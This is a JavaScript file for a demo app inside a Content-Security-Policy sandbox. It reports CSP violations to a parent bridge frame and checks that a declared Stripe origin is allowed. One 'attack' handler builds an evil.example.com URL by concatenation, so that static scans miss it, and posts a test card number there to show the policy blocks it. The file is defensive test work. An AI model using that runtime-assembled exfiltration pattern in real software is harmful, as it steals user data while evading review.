// TFB Skybridge — third-party app logic (externalized from app.html in 0.1.3).
//
// This file is byte-stable: no template substitution. The bridge origin
// comes from a config endpoint (window.SKYBRIDGE_INNER_CFG, populated by
// /inner/config.js loaded synchronously before this script).
//
// Per Dev's round-2 Q1 ruling: externalize the inner app's inline scripts
// to files served from the inner origin so `script-src 'self'` covers them.
// Keeping the app artifact byte-stable preserves content-addressability —
// the property the certificate's witness re-hash depends on, and the
// foundation any future content-addressed artifact distribution layer
// (Q3 gate-(a)) will rest on.

  if (!window.SKYBRIDGE_INNER_CFG ||
      typeof window.SKYBRIDGE_INNER_CFG.ORIGIN_HOST !== "string") {
    throw new Error("/inner/config.js failed to load — SKYBRIDGE_INNER_CFG missing");
  }
  const ORIGIN_BRIDGE = window.SKYBRIDGE_INNER_CFG.ORIGIN_HOST;

  const log = (msg, cls) => {
    const el = document.getElementById("log");
    const line = document.createElement("div");
    if (cls) line.className = cls;
    line.textContent = msg;
    el.appendChild(line);
  };

  // --- inner-frame violation shim (post §6.4 + Dev §4 cross-origin) ---
  // This frame loads from http://localhost:4001 under the broad cert CSP.
  // Its `parent` is the BRIDGE at http://localhost:4000 (distinct origin).
  // The bridge handles the durable POST /report and the relay up to the host;
  // this frame (a) logs locally and (b) tells the bridge what happened —
  // using the bridge's EXACT origin as targetOrigin. No '*'.

  const cspBlocked = new Set();
  document.addEventListener("securitypolicyviolation", (e) => {
    cspBlocked.add(e.blockedURI);
    log("⛔ blocked by CSP: " + e.blockedURI + "  (" + e.violatedDirective + ")", "blocked");
    parent.postMessage({ type: "violation", blockedURI: e.blockedURI, directive: e.violatedDirective }, ORIGIN_BRIDGE);
  });

  // --- the app's one legitimate action: call its declared backend ---
  document.getElementById("pay").addEventListener("click", async () => {
    try {
      const r = await fetch("/api/charge");
      const d = await r.json();
      log("✓ charge ok: " + d.charged + " @ " + d.at, "ok");
    } catch (err) {
      log("charge failed: " + err);
    }
  });

  // --- declared external origin: api.stripe.com is named in the certificate ---
  // The cert lists `connect-src https://api.stripe.com` (cables witnessed it in
  // app.js), so the CSP allows the request. The network call itself will fail
  // (offline / CORS / not a real session), but the SECURITY-relevant signal is
  // the *absence* of a CSP violation event for this URL — that's what proves
  // the policy correctly distinguished declared from undeclared.
  document.getElementById("declared").addEventListener("click", async () => {
    const url = "https://api.stripe.com/v1/charges";
    log("→ app tries DECLARED origin " + url + " …");
    try { await fetch(url, { method: "POST", body: "{}" }); } catch (_) { /* expected */ }
    // Give the violation handler a tick to fire if the browser would block.
    await new Promise((r) => setTimeout(r, 250));
    if (cspBlocked.has(url)) {
      log("CSP unexpectedly blocked declared origin (something regressed)", "blocked");
      return;
    }
    log("✓ CSP allowed declared origin (no violation fired for " + url + ")", "allowed");
    parent.postMessage({ type: "declared-allowed", url }, ORIGIN_BRIDGE);
  });

  // --- the attack: assemble an undeclared host AT RUNTIME and try to exfiltrate ---
  // Built by concatenation so no literal "evil" URL exists in source — the class
  // of attack a static scan cannot see, but the enforced CSP blocks anyway.
  document.getElementById("attack").addEventListener("click", () => {
    const host = ["https://", "evil.", "example", ".com"].join("");
    const url = host + "/steal?data=" + encodeURIComponent("card=4242-4242-4242-4242");
    log("→ app attempts egress to " + host + " …");
    fetch(url, { method: "POST", body: "stolen" }).catch(() => {
      /* the rejection is expected; the securitypolicyviolation handler does the work */
    });
  });
